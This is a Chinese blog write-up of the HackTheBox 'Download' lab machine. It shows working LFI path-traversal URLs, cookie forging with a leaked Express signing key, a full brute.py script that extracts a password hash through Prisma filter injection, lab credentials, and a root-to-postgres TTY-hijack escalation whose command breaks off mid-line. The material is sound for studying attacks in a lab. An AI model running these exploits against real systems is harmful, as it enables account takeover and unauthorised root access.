---
title: Download - HackTheBox
url: https://darkwing.moe/2023/08/08/Download-HackTheBox/
source: 喵喵喵喵
date: 2023-08-09
fetch_date: 2025-10-04T11:58:39.890569
---

# Download - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Download - HackTheBox

# Download - HackTheBox

##### 2023-08-08

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. Download](#Download)
   1. [3.1. LFI](#LFI)
   2. [3.2. package.json](#package-json)
   3. [3.3. auth.js](#auth-js)
4. [4. download\_session](#download-session)
   1. [4.1. home](#home)
   2. [4.2. brute password](#brute-password)
   3. [4.3. brute.py](#brute-py)
5. [5. user flag](#user-flag)
6. [6. 提权信息](#提权信息)
   1. [6.1. postgresql](#postgresql)
7. [7. 提权 & root flag](#提权-amp-root-flag)
   1. [7.1. exp.c](#exp-c)
   2. [7.2. shadow](#shadow)
   3. [7.3. root\_id\_rsa](#root-id-rsa)
8. [8. 参考资料](#参考资料)

# Download - HackTheBox

2023-08-08

# 基本信息

* <https://app.hackthebox.com/machines/Download>
* 10.10.11.226

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023080701.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.226 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-07 15:33 CST Nmap scan report for 10.10.11.226 Host is up (0.16s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 cc:f1:63:46:e6:7a:0a:b8:ac:83:be:29:0f:d6:3f:09 (RSA) |   256 2c:99:b4:b1:97:7a:8b:86:6d:37:c9:13:61:9f:bc:ff (ECDSA) |_  256 e6:ff:77:94:12:40:7b:06:a2:97:7a:de:14:94:5b:ae (ED25519) 80/tcp open  http    nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://download.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.16 seconds ``` |

## 80

需要加hosts,在线文件共享：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.226 download.htb ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023080702.jpg)

# Download

尝试注册报错(后面根据代码可以知道是用户名有最短长度要求)，但可以匿名上传下载，文件名是uuid：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023080703.jpg)

## LFI

根据响应头知道是Express，可以猜测代码大概类似这样：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` # route  /download/{file_name}  return {file_name} ../xxxx ..%2fxxxx ``` |

那可以尝试读取其他文件，因为是Express，尝试读取app.js,注意编码,验证存在LFI,并且代码中得到download\_session使用的key：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` name: "download_session", keys: ["8929874489719802418902487651347865819634518936754"] ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023080704.jpg)

## package.json

同样的方法读取package.json，得到用户名wesley(这个用户名也可以通过修改id得到)：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023080705.jpg)

## auth.js

auth里可以知道用户名有最短长度要求：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023080706.jpg)

# download\_session

根据前面的信息重新注册登录，得到的cookie解码，发现user相关信息：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 ``` | ``` {   "flashes": {     "info": [],     "error": [],     "success": [       "You are now logged in."     ]   },   "user": {     "id": 73,     "username": "miao@miao.com"   } } ``` |

express cookie，已有key，可以使用cookie-monster签名

* DigitalInterruption/cookie-monster: A utility for automating the testing and re-signing of Express.js cookie secrets.
  <https://github.com/DigitalInterruption/cookie-monster>

尝试直接修改id为1，去掉用户名，生成新cookie，然后查看home得到WESLEY上传的文件：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` cookie-monster -e -f cookie.json -k 8929874489719802418902487651347865819634518936754 -n download_session ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023080707.jpg)

但文件中并没什么有用信息

## home

继续看代码，Home.js发现prisma：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023080709.jpg)

根据文档查看prisma文件：

* Working with PrismaClient (Concepts)
  <https://www.prisma.io/docs/concepts/components/prisma-client/working-with-prismaclient>

|  |  |
| --- | --- |
| ``` 1 ``` | ``` http://download.htb/files/download/..%2fnode_modules%2f.prisma%2fclient%2fschema.prisma ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023080710.jpg)

user model中有username和password，而prisma可以使用一些条件进行过滤：

* Filtering and Sorting (Concepts)
  <https://www.prisma.io/docs/concepts/components/prisma-client/filtering-and-sorting>

## brute password

后面就是根据这些信息，通过使用prisma支持的过滤条件来爆破出wesley的密码md5，解出来密码(爆破脚本来自discord)：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023080711.jpg)

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` $ python3 brute.py f88976c10af66915918945b9679b2bd3  dunkindonuts ``` |

## brute.py

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ``` | ``` import string, subprocess, json, re, requests  regex = r"download_session=([\w=\-_]+).*download_session\.sig=([\w=\-_]+)"   def writeJson(j):   with open("cookie.json", "w") as f:     f.write(json.dumps(j))      def generateCookieAndSign(startsWith):   j = {"user":{"username":{"contains": "WESLEY"}, "password":{"startsWith":startsWith}}}   writeJson(j)   out = subprocess.check_output(["cookie-monster", "-e", "-f", "cookie.json", "-k", "8929874489719802418902487651347865819634518936754", "-n", "download_session"]).decode().replace("\n"," ")   matches = re.findall(regex, out, re.MULTILINE)[0]   return matches    passwd = "" alphabet="abcdef"+string.digits for i in range(32):   #print(passwd)   for s in alphabet:     p = passwd + s     (download_session, sig) = generateCookieAndSign(p)     cookie = {"download_session": download_session, "download_session.sig": sig}     #print(p, cookie)     print(p, end='\r')     r = requests.get('http://download.htb/home/', cookies=cookie)     if len(r.text) != 2174:       passwd = p       break print() print(passwd) ``` |

# user flag

得到的账号密码ssh登录：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` ssh wesley@10.10.11.226 dunkindonuts ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023080708.jpg)

# 提权信息

pspy发现root定期切换到postgres执行一些操作：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` cat /etc/passwd | grep postgresql  postgres:x:113:118:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023080713.jpg)

枚举服务可以发现download-site， 对应文件里得到pstgresql数据库账号密码:

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` systemctl list-units --type=service cat /etc/systemd/system/download-site.service  postgresql://download:CoconutPineappleWatermelon@localhost:5432/download ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023080714.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023080712.jpg)

## postgresql

得到的信息连接postgresql数据库,发现有写文件权限,可以通过数据库向postgresql用户目录写文件

再结合前面root会定期切换到postgresql用户，这种场景可以劫持root用户tty来执行一些文件：

* su/sudo from root to another user allows TTY hijacking and arbitrary code execution
  <https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking>

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` psql "postgresql://download:CoconutPineappleWatermelon@localhost:5432/download"  download=> \du ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023080715.jpg)

# 提权 & root flag

root su切换到postgresql，会自动加载postgresql用户目录的bashrc,bash\_profile之类文件并执行其中命令，而结合前面信息，可以通过postgresql数据库向postgresql用户目录写文件

那就是本地编译exp，通过数据库写文件，然后等待root触发执行：

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` gcc exp.c -static -o exp  # postgresql数据库内 download=> COPY (SELECT CAST('/t...